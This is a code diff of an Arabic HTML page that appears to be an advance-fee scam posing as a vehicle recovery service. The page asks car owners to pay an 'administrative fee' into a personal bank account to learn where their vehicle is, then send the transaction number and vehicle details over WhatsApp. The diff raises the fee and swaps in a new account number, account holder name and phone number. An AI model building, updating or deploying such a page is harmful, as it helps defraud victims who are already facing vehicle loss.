@@ -252,9 +252,9 @@
             <h2 style="color: var(--primary-gold);">الرسوم الإدارية</h2>
             <p style="font-size: 0.9rem; line-height: 1.5;">لتحديد موقع وجود المركبة الدقيق، يرجى دفع رسوم إدارية لتغطية نفقات الفريق العامل وإكمال إجراءات التسليم.</p>
             <div class="payment-box">
-                <p>المبلغ: <strong>200,000 ج.س</strong></p>
-                <p>رقم الحساب: <br><strong style="color: var(--primary-gold);">7867881</strong></p>
-                <p>اسم صاحب الحساب: <br><strong style="color: var(--primary-gold);">حافظ حسن</strong></p>
+                <p>المبلغ: <strong>300,000 ج.س</strong></p>
+                <p>رقم الحساب: <br><strong style="color: var(--primary-gold);">7500125</strong></p>
+                <p>اسم صاحب الحساب: <br><strong style="color: var(--primary-gold);">حافظ آدم</strong></p>
             </div>
             <div class="input-group"><label>رقم العملية</label><input type="text" id="transactionId" placeholder="ادخل رقم العملية هنا بعد نسخه من الاشعار"></div>
             <button class="btn-submit btn-whatsapp" onclick="sendToWhatsApp()">تأكيد البلاغ عبر الواتساب</button>
@@ -299,7 +299,7 @@
 
     function sendToWhatsApp() {
         const transId = document.getElementById('transactionId').value;
-        const phone = "+249100850483"; 
+        const phone = "249112508713"; 
         
         if(!transId) return alert("أدخل رقم العملية");
         const msg = `*بلاغ استرداد مركبة - منصة رصد*%0A- النوع: ${document.getElementById('carName').value}%0A- اللوحة: ${document.getElementById('plateNumber').value}%0A- المالك: ${document.getElementById('ownerName').value}%0A- رقم العملية: ${transId}`;
